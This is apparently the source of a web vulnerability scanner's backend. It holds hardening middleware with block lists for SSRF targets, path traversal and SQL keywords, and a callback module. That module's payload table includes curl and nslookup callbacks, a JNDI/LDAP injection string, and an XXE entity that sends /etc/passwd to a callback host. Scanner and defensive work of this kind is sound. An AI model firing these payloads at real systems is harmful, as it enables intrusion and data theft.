import sys
import os
sys.path.insert(0, os.path.abspath('backend'))

from bs4 import BeautifulSoup
from celery import Celery
from celery.schedules import crontab
from collections import defaultdict
from scanners.base_scanner import (
    active_scan_logs, add_log, get_scan_logs, parse_domain,
    cleanup_scan_logs, schedule_log_cleanup, emit_scan_progress
)
from scanners import get_pipeline, get_phases, build_scanner, apply_scan_options
from utils.fuzzer_engine import ContextAwareFuzzer
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from datetime import datetime, timezone
from datetime import datetime, timezone, timedelta
from datetime import datetime, timezone, timezone
from dotenv import load_dotenv
load_dotenv()

import stripe
from flask import Blueprint, request, jsonify, current_app, send_from_directory
from werkzeug.utils import secure_filename
from flask import Blueprint, send_file, jsonify, request
from flask import Flask
from flask import jsonify
from flask import render_template
from flask import request, abort, g, Response, make_response
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_sqlalchemy import SQLAlchemy
from functools import wraps
from markupsafe import escape  # always available with Flask
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.pdfgen import canvas
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, Image, Flowable
from reportlab.graphics.shapes import Drawing
from reportlab.graphics.charts.barcharts import VerticalBarChart
from sqlalchemy import event
from sqlalchemy import func
from sqlalchemy import inspect, text
from sqlalchemy import text
from sqlalchemy.engine import Engine
from typing import Any
from typing import Any, Callable
from typing import Callable
from typing import Literal
from urllib.parse import urljoin, urlparse
from urllib.parse import urlparse
import base64
import bcrypt
import concurrent.futures
from backend.utils.email_service import (
    send_welcome_email, 
    send_scan_started, 
    send_scan_completed, 
    send_scan_failed,
    send_critical_alert
)

import hashlib
import html
import io
import itertools
import json
import jwt
import math
import os
import re
import re, time, ipaddress, os, hashlib, threading
import requests
import socket
import sqlite3
import ssl
import statistics
import threading
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request
import urllib3
import uuid
import ipaddress



from .extensions import db, celery, socketio, limiter
from .models import *


# --- From security_middleware.py ---
"""
security_middleware.py - WSS Security Hardening Middleware
==========================================================
Implements all 15 scan-findings remediations as Flask middleware/helpers.
Apply to any Flask app via: app = apply_security_hardening(app)

Fixes:
  FIX-1:  SSTI - safe template renderer (never passes raw user input to Jinja2)
  FIX-2:  SQL injection - parameterized query helpers + input validator
  FIX-4:  SSRF - outbound request firewall (blocks RFC-1918 + cloud metadata)
  FIX-5:  LFI - file parameter whitelist validator
  FIX-6:  MFA rate limiting - sliding-window limiter (5 attempts / 15 min)
  FIX-7:  ReDoS - safe email regex + input length limit
  FIX-10: Cache poisoning - X-Forwarded-Proto sanitizer
  FIX-11: Security headers - COOP, COEP, CORP, Referrer-Policy, Permissions-Policy
  FIX-14: Open redirect - referer/return_url allowlist validator
  FIX-15: Browser cache - no-store on authenticated/sensitive pages
"""

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-1: SSTI - Safe Template Renderer
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def safe_render(template_name: str, **context) -> str:
    """
    SSTI fix: only pass pre-defined context variables to templates.
    NEVER use render_template_string() with user input.

    Usage:
        # WRONG (vulnerable):
        render_template_string("Hello {{ name }}", name=request.args["name"])

        # RIGHT (safe):
        return safe_render("hello.html", name=request.args.get("name", ""))
    """
    # Sanitize all string context values - escape HTML to prevent XSS
    safe_context = {}
    for k, v in context.items():
        if isinstance(v, str):
            # Strip Jinja2 template syntax from user-supplied values
            v = re.sub(r'\{%.*?%\}|\{\{.*?\}\}|\{#.*?#\}', '', v, flags=re.DOTALL)
            v = str(escape(v))
        safe_context[k] = v
    return render_template(template_name, **safe_context)


def sanitize_template_input(value: str) -> str:
    """
    Strip Jinja2/Twig/SSTI syntax from any user-supplied string.
    Call on every user input before passing into any templating context.
    """
    # Remove {{ }}, {% %}, {# #} - all template expression types
    cleaned = re.sub(r'\{[{%#].*?[}%#]\}', '', value, flags=re.DOTALL)
    # Also strip raw < > to prevent HTML injection
    return cleaned.strip()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-2: SQL Injection - Safe Query Helpers
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class SafeQueryBuilder:
    """
    Parameterized query helper. Never concatenate user input into SQL.

    Usage with SQLAlchemy:
        sqb = SafeQueryBuilder()
        results = sqb.execute(db.session, "SELECT * FROM users WHERE id = :id", {"id": user_id})

    Usage with raw psycopg2/sqlite3:
        cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))
        # NEVER:  f"SELECT * FROM products WHERE id = {product_id}"
    """
    # Blocked SQL keywords in user input (defense-in-depth)
    _BLOCKED_PATTERNS = re.compile(
        r"(--|\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b"
        r"|\bDROP\b|\bDELETE\b|\bTRUNCATE\b|\bEXEC\b|\bXP_\b|\bSLEEP\b|\bWAITFOR\b"
        r"|;|\bINFORMATION_SCHEMA\b|\bSYSOBJECTS\b|\bPG_SLEEP\b|/\*)",
        re.IGNORECASE,
    )

    @classmethod
    def validate_id(cls, value, name: str = "id") -> int:
        """Validate that a URL/form ID parameter is a plain integer. Raises ValueError otherwise."""
        try:
            int_val = int(str(value).strip())
            if int_val < 0:
                raise ValueError(f"{name} must be non-negative")
            return int_val
        except (ValueError, TypeError):
            raise ValueError(f"Invalid {name}: must be a positive integer, got {value!r}")

    @classmethod
    def validate_string(cls, value: str, max_len: int = 255, name: str = "field") -> str:
        """Validate a string parameter doesn't contain SQL injection patterns."""
        if not isinstance(value, str):
            raise ValueError(f"{name} must be a string")
        if len(value) > max_len:
            raise ValueError(f"{name} exceeds max length {max_len}")
        if cls._BLOCKED_PATTERNS.search(value):
            raise ValueError(f"Invalid characters in {name}")
        return value.strip()

    @staticmethod
    def execute(session, query: str, params: dict):
        """Execute a parameterized SQLAlchemy query safely."""
        return session.execute(text(query), params)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-4: SSRF - Outbound Request Firewall
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

_BLOCKED_SSRF_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),   # AWS/Azure IMDS - CRITICAL
    ipaddress.ip_network("100.64.0.0/10"),    # Shared address space
    ipaddress.ip_network("::1/128"),          # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),         # IPv6 private
]

_BLOCKED_SSRF_HOSTNAMES = frozenset({
    "localhost", "metadata.google.internal", "kubernetes.default.svc",
    "kubernetes.default", "169.254.169.254", "100.100.100.200",
})

_BLOCKED_SSRF_SCHEMES = frozenset({"file", "gopher", "dict", "ftp", "sftp", "ldap", "ldaps"})


def validate_outbound_url(url: str) -> str:
    """
    SSRF firewall - validate a user-supplied URL before fetching it.
    Raises ValueError for blocked targets.

    Usage:
        url = request.args.get("url", "")
        try:
            safe_url = validate_outbound_url(url)
        except ValueError as e:
            abort(400, str(e))
        response = requests.get(safe_url, timeout=5)
    """
    try:
        parsed = urlparse(url)
    except Exception:
        raise ValueError("Invalid URL")

    if parsed.scheme.lower() in _BLOCKED_SSRF_SCHEMES:
        raise ValueError(f"Blocked URL scheme: {parsed.scheme}")

    if parsed.scheme.lower() not in ("http", "https"):
        raise ValueError("Only http/https URLs are permitted")

    hostname = (parsed.hostname or "").lower()
    if not hostname:
        raise ValueError("URL must have a hostname")

    if hostname in _BLOCKED_SSRF_HOSTNAMES:
        raise ValueError(f"Access to {hostname} is not permitted")

    # Resolve hostname and check if it resolves to a private IP
    try:
        addrs = {info[4][0] for info in socket.getaddrinfo(hostname, None)}
        for addr in addrs:
            try:
                ip_obj = ipaddress.ip_address(addr)
                for net in _BLOCKED_SSRF_NETWORKS:
                    if ip_obj in net:
                        raise ValueError(f"Resolved IP {addr} is in a private/reserved range")
            except (ipaddress.AddressValueError, ValueError):
                raise
    except socket.gaierror:
        raise ValueError(f"Cannot resolve hostname: {hostname}")

    return url


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-5: LFI - File Parameter Whitelist Validator
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

_LFI_PATTERNS = re.compile(
    r'(\.\.[\\/]|%2e%2e[\\/]|%252e%252e[\\/]|%c0%af|%c1%9c'
    r'|\/etc\/|\/proc\/|\/sys\/|php://|file://|expect://|zip://)',
    re.IGNORECASE,
)

def validate_file_param(
    filename: str,
    allowed_extensions: set | None = None,
    base_dir: str | None = None,
) -> str:
    """
    LFI fix - validate a filename parameter.
    Raises ValueError if path traversal or forbidden patterns detected.

    Usage:
        fname = request.args.get("file", "")
        try:
            safe_name = validate_file_param(fname, allowed_extensions={".pdf", ".png"}, base_dir="/var/app/uploads")
        except ValueError:
            abort(400, "Invalid file parameter")
    """
    if not filename:
        raise ValueError("File parameter is required")

    if _LFI_PATTERNS.search(filename):
        raise ValueError("Path traversal detected")

    # Strip any directory components - only allow base filename
    basename = os.path.basename(filename)
    if basename != filename:
        raise ValueError("Directory separators not allowed in file parameter")

    if allowed_extensions:
        ext = os.path.splitext(basename)[1].lower()
        if ext not in allowed_extensions:
            raise ValueError(f"File extension {ext!r} not allowed")

    if base_dir:
        full_path = os.path.realpath(os.path.join(base_dir, basename))
        if not full_path.startswith(os.path.realpath(base_dir)):
            raise ValueError("Path traversal detected via symlink")

    return basename


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-6: MFA Rate Limiting - Sliding Window (5 attempts / 15 min)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class SlidingWindowRateLimiter:
    """
    In-memory sliding window rate limiter for MFA/OTP endpoints.

    Usage:
        _otp_limiter = SlidingWindowRateLimiter(max_attempts=5, window_seconds=900)

        @app.route("/api/mfa/verify", methods=["POST"])
        def verify_mfa():
            key = f"mfa:{current_user.id}"
            if not _otp_limiter.allow(key):
                return jsonify({"error": "too_many_attempts"}), 429
            ...
    """
    def __init__(self, max_attempts: int = 5, window_seconds: int = 900):
        self.max_attempts   = max_attempts
        self.window_seconds = window_seconds
        self._store: dict[str, list[float]] = defaultdict(list)
        self._lock = threading.Lock()

    def allow(self, key: str) -> bool:
        """Returns True if the request is within the rate limit, False if blocked."""
        now = time.monotonic()
        cutoff = now - self.window_seconds
        with self._lock:
            timestamps = self._store[key]
            # Prune old timestamps outside the window
            self._store[key] = [t for t in timestamps if t > cutoff]
            if len(self._store[key]) >= self.max_attempts:
                return False
            self._store[key].append(now)
            return True

    def reset(self, key: str) -> None:
        """Reset the counter for a key (call after successful auth)."""
        with self._lock:
            self._store.pop(key, None)

    def retry_after(self, key: str) -> int:
        """Return seconds until the oldest attempt falls outside the window."""
        now = time.monotonic()
        cutoff = now - self.window_seconds
        with self._lock:
            timestamps = [t for t in self._store.get(key, []) if t > cutoff]
            if not timestamps:
                return 0
            return int(self.window_seconds - (now - min(timestamps))) + 1


# Singleton for MFA endpoints
_mfa_limiter = SlidingWindowRateLimiter(max_attempts=5, window_seconds=900)


def mfa_rate_limit(f):
    """
    Flask decorator "- apply MFA rate limiting.
    Uses IP + user identifier as the key.

    Usage:
        @app.route("/api/mfa/verify", methods=["POST"])
        @mfa_rate_limit
        def verify_mfa():
            ...
    """
    @wraps(f)
    def wrapper(*args, **kwargs):
        # Build a stable key from IP + any user identifier in body
        ip  = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip()
        body = request.get_json(silent=True) or {}
        uid = str(body.get("user_id", body.get("email", body.get("username", "anon"))))
        key = hashlib.sha256(f"{ip}:{uid}".encode()).hexdigest()[:32]

        if not _mfa_limiter.allow(key):
            retry = _mfa_limiter.retry_after(key)
            resp = jsonify({"error": "too_many_attempts", "retry_after": retry})
            resp.status_code = 429
            resp.headers["Retry-After"] = str(retry)
            return resp
        return f(*args, **kwargs)
    return wrapper


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-7: ReDoS - Safe Email Validator (RE2-compatible, linear time)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# RFC 5321 simplified - NO nested quantifiers, linear time O(n)
_EMAIL_SAFE_RE = re.compile(
    r'^[a-zA-Z0-9][a-zA-Z0-9._+\-]{0,62}@[a-zA-Z0-9][a-zA-Z0-9.\-]{0,253}[a-zA-Z0-9]\.[a-zA-Z]{2,24}$'
)
MAX_EMAIL_LENGTH = 254  # RFC 5321


def validate_email_safe(email: str) -> str:
    """
    ReDoS-safe email validator.
    - Hard length cap BEFORE regex (prevents catastrophic backtracking)
    - Uses a linear-time RE2-compatible pattern (no nested quantifiers)

    Usage:
        try:
            email = validate_email_safe(request.form["email"])
        except ValueError:
            abort(400, "Invalid email address")
    """
    if not isinstance(email, str):
        raise ValueError("Email must be a string")
    email = email.strip()
    # CRITICAL: length check BEFORE regex - this alone prevents most ReDoS
    if len(email) > MAX_EMAIL_LENGTH:
        raise ValueError(f"Email too long (max {MAX_EMAIL_LENGTH} characters)")
    if not _EMAIL_SAFE_RE.match(email):
        raise ValueError("Invalid email format")
    return email.lower()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-10: Cache Poisoning - X-Forwarded-Proto Sanitizer
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

_SAFE_PROTO_RE = re.compile(r'^(https?|wss?)$', re.IGNORECASE)


def get_safe_scheme() -> str:
    """
    Cache poisoning fix: validate X-Forwarded-Proto before trusting it.
    Only accept 'http' or 'https' - reject all other values.

    Usage (in Flask before_request or ProxyFix replacement):
        scheme = get_safe_scheme()
        if scheme == "https":
            do_secure_thing()
    """
    proto = request.headers.get("X-Forwarded-Proto", "")
    if proto and _SAFE_PROTO_RE.match(proto):
        return proto.lower()
    # Fall back to the actual connection scheme
    return request.scheme


class SafeProxyFix:
    """
    Drop-in replacement for Werkzeug's ProxyFix that validates
    X-Forwarded-Proto before trusting it (prevents cache poisoning).

    Usage:
        app.wsgi_app = SafeProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=0)
    """
    def __init__(self, app, x_for: int = 1, x_proto: int = 1, x_host: int = 0):
        self.app     = app
        self.x_for   = x_for
        self.x_proto = x_proto
        self.x_host  = x_host

    def __call__(self, environ, start_response):
        if self.x_proto:
            proto = environ.get("HTTP_X_FORWARDED_PROTO", "")
            if _SAFE_PROTO_RE.match(proto):
                environ["wsgi.url_scheme"] = proto.lower()
            else:
                # Strip invalid/poisoned proto header
                environ.pop("HTTP_X_FORWARDED_PROTO", None)

        if self.x_for:
            forwarded_for = environ.get("HTTP_X_FORWARDED_FOR", "")
            if forwarded_for:
                # Only trust the first IP (leftmost = original client)
                first_ip = forwarded_for.split(",")[0].strip()
                try:
                    ipaddress.ip_address(first_ip)
                    environ["REMOTE_ADDR"] = first_ip
                except ValueError:
                    pass  # Invalid IP - keep original REMOTE_ADDR

        return self.app(environ, start_response)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-11: Security Headers - Full Suite
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

_SECURITY_HEADERS = {
    # Prevent clickjacking
    "X-Frame-Options": "SAMEORIGIN",
    # Prevent MIME sniffing
    "X-Content-Type-Options": "nosniff",
    # HSTS - 2 years, include subdomains, preload
    "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
    # XSS filter (legacy browsers)
    "X-XSS-Protection": "1; mode=block",
    # Referrer-Policy - don't leak URL to third parties
    "Referrer-Policy": "strict-origin-when-cross-origin",
    # Permissions-Policy - disable unneeded browser APIs
    "Permissions-Policy": (
        "camera=(), microphone=(), geolocation=(), payment=(), "
        "usb=(), accelerometer=(), gyroscope=(), magnetometer=()"
    ),
    # COOP - prevent cross-origin window access (XS-Leaks)
    "Cross-Origin-Opener-Policy": "same-origin",
    # COEP - require COOP isolation
    "Cross-Origin-Embedder-Policy": "require-corp",
    # CORP - prevent spectre-style cross-origin reads
    "Cross-Origin-Resource-Policy": "same-origin",
    # Certificate Transparency
    "Expect-CT": "max-age=86400, enforce",
}

def add_security_headers(response: Response) -> Response:
    """
    Flask after_request hook - adds all missing security headers.

    Usage:
        app.after_request(add_security_headers)
    """
    for header, value in _SECURITY_HEADERS.items():
        if header not in response.headers:
            response.headers[header] = value
    # Remove information-disclosure headers
    response.headers.pop("Server", None)
    response.headers.pop("X-Powered-By", None)
    return response


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-14: Open Redirect - Referer/return_url Allowlist
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def validate_redirect_url(
    url: str,
    allowed_hosts: set | None = None,
    default_url: str = "/",
) -> str:
    """
    Open redirect fix - validate a redirect URL against an allowlist.

    Usage:
        next_url = request.args.get("next", "/")
        safe_url = validate_redirect_url(next_url, allowed_hosts={"larshield.com", "www.larshield.com"})
        return redirect(safe_url)
    """
    if not url or not url.strip():
        return default_url

    url = url.strip()

    # Allow relative URLs (no host = safe)
    parsed = urlparse(url)
    if not parsed.scheme and not parsed.netloc:
        # Ensure it starts with / to prevent protocol-relative URLs
        if url.startswith("/") and not url.startswith("//"):
            return url
        return default_url

    # For absolute URLs, validate host
    host = parsed.netloc.lower().split(":")[0]  # strip port
    if allowed_hosts and host in allowed_hosts:
        return url

    # Unknown host - redirect to safe default
    return default_url


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FIX-15: Browser Cache - No-Store on Sensitive Pages
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

_SENSITIVE_PATH_PATTERNS = re.compile(
    r'^/(api|account|profile|dashboard|admin|settings|payment|checkout|invoice|report)',
    re.IGNORECASE,
)


def no_cache_sensitive(response: Response) -> Response:
    """
    Flask after_request hook - prevents browsers from caching
    authenticated/sensitive pages.

    Usage:
        app.after_request(no_cache_sensitive)
    """
    path = request.path
    if _SENSITIVE_PATH_PATTERNS.match(path) or request.method in ("POST", "PUT", "PATCH", "DELETE"):
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Master installer - apply all fixes to Flask app
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def apply_security_hardening(app, allowed_redirect_hosts: set | None = None):
    """
    Apply all security fixes to a Flask application in one call.

    Usage:
        app = Flask(__name__)
        app = apply_security_hardening(app, allowed_redirect_hosts={"larshield.com"})
    """
    # FIX-10: Safe proxy fix (X-Forwarded-Proto validation)
    app.wsgi_app = SafeProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=0)

    # FIX-11 + FIX-15: Security headers + cache control
    app.after_request(add_security_headers)
    app.after_request(no_cache_sensitive)

    app.logger.info("[SecurityHardening] Applied: headers, cache-control, proxy-fix")
    return app


# --- From callback.py ---

CALLBACK_BASE = os.environ.get(
    "WSS_CALLBACK_BASE",
    "https://callback.internal/receive",
)


def generate_callback_id() -> str:
    return uuid.uuid4().hex[:16]


def build_callback_url(path: str = "/xss") -> str:
    cid = generate_callback_id()
    return f"{CALLBACK_BASE.rstrip('/')}/{cid}{path}"


def build_oob_domain(subdomain: str | None = None) -> str:
    base = CALLBACK_BASE.replace("https://", "").replace("http://", "").split("/")[0]
    sub = subdomain or generate_callback_id()
    return f"{sub}.{base}"


def probe_callback(callback_url: str, timeout: int = 3) -> bool:
    try:
        req = urllib.request.Request(callback_url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status == 200
    except Exception:
        return False


SYNTHETIC_CALLBACKS = {
    "dns": "nslookup {oob}",
    "http": "curl {callback}",
    "ldap": "ldap://{oob}/a",
    "jndi": "${jndi:ldap://{oob}/a}",
    "xxe_oob": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % oob \"<!ENTITY exfil SYSTEM '{callback}?data=%file;'>\">%oob;",
}

